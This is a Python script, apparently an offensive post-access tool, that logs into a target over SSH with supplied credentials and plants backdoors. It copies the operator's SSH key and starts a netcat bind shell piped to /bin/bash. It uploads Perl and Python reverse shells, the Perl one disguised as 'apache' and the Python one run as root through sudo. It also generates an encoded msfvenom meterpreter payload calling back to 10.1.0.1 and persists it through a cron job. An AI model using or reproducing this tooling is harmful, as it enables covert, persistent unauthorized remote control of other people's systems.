from paramiko import SSHClient
from scp import SCPClient
import paramiko
import os
import socket
import subprocess

ip_address = "10.1.0.1"

def scpFiles(filename, recur=True):
    ssh.exec_command("rm " + filename)
    scp.put(filename, recursive=recur)

def netcatBackdoor():
    ssh.exec_command("rm " + foo)
    ssh.exec_command("nohup mkfifo foo ; nc -lk 53920 0<foo | /bin/bash 1>foo &")
    print("Netcat backdoor on port 53920 attempted. Access this with nc <ip> 53920")

def perlBackdoor():
	raw_input("Please edit the prs.pl file to put in your ip. Press enter to continue.")
	raw_input("Enter the following command: nc -v -n -l -p 53921. Press enter")
	scpFiles('prs.pl', False)
	print("Moving the backdoor script.")
	ssh.exec_command("nohup perl prs.pl")
	print("Perl backdoor on port 53921 attempted. It's gonna name itself apache so hopefully the target won't see what's going on. If you stop the listener, the backdoor will stop.")

def pythBackdoor():
    newIP = ""
    if(raw_input("Press y to continue with localhost ip " + localIP) == 'y'):
        newIP = localIP
    else:
        newIP = raw_input("Please input the ip you want to use")

    toW = 'pythBackdoor.py'
    part1 = 'pythPart1'
    part2 = 'pythPart2'
    stringToAdd = ""
    fileToWrite = open(toW, 'w')

    with open ("pythPart1", "r") as myfile:
        data=myfile.read()#.replace('\n', '')
    data = data[:-1]
    stringToAdd+=data + newIP
#    stringToAdd+= newIP
    print stringToAdd
    #fileToWrite.write(data)
    #fileToWrite.write(newIP)
    
    with open ("pythPart2", "r") as myfile:
        data=myfile.read()#.replace('\n', '')
#    fileToWrite.write(data)
    stringToAdd+=data
    fileToWrite.write(stringToAdd)
    raw_input("Enter the following command: nc -v -n -l -p 53922. Press enter")
    ssh.exec_command('rm pythBackdoor.py')
    scpFiles('pythBackdoor.py', False)
    print("Moving the backdoor script.")
    ssh.exec_command("echo " +  pword + " | sudo -S nohup python pythBackdoor.py")
    print("Note: if you don't give me root, this won't be happy. Python backdoor on 53922 attempted.")

def metasploitBackdoor():
     cron = (raw_input("Press y to start backdoor as a cronjob (recommended): ") == 'y')
     os.system("msfvenom -a x86 -p linux/x86/meterpreter/reverse_tcp lhost=10.1.0.1 lport=4444 --platform=Linux -o initd -f elf -e x86/shikata_ga_nai") #% ip_address)
     scpFiles('initd', False)
     print("Backdoor sript moved")
     ssh.exec_command("chmod +x initd")
     if cron:
         ssh.exec_command("crontab -l > mycron")
         ssh.exec_command("echo \"* * * * * ./initd\" >> mycron && crontab mycron && rm mycron")

     ssh.exec_command("nohup ./initd > /dev/null &")
     print("Backdoor attempted on port 4444.  To access, open msfconsole and run:")
     print("use multi/handler\n \
     > set PAYLOAD linux/x64/shell/reverse_tcp\n \
     > set LHOST <LOCAL IP ADDRESS>\n \
     > set LPORT 4444\n \
     > exploit")


proc = subprocess.Popen(["ifconfig | grep inet | head -n1 | cut -d\  -f12 | cut -d: -f2"], stdout=subprocess.PIPE, shell=True)
localIP = proc.stdout.read()
localIP = localIP[:-1]
print("Your IP is: " + localIP)
hostname = raw_input('Hostname: ')
port = 22;
uname = raw_input('Username: ')
pword = raw_input('Password: ')
if (raw_input("Press y to copy private key over to target: ") == 'y'):
    os.system("sshpass -p %s ssh-copy-id %s@%s" % (pword, uname, hostname))
print("Opening SSH connection to target...")
ssh = SSHClient()
ssh.load_system_host_keys()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(hostname, username=uname, password=pword)
scp = SCPClient(ssh.get_transport())

scpFiles('test/')
if(raw_input('Press y to start a netcat backdoor: ') == 'y'):
	netcatBackdoor()
if(raw_input('Press y to start a perl backdoor: ') == 'y'):
	perlBackdoor()
if(raw_input('Press y to start a python backdoor: ') == 'y'):
    pythBackdoor()
if(raw_input('Press y to start a metasploit backdoor: ') == 'y'):
    metasploitBackdoor()
raw_input('Press any key to close the program.')
scp.close()



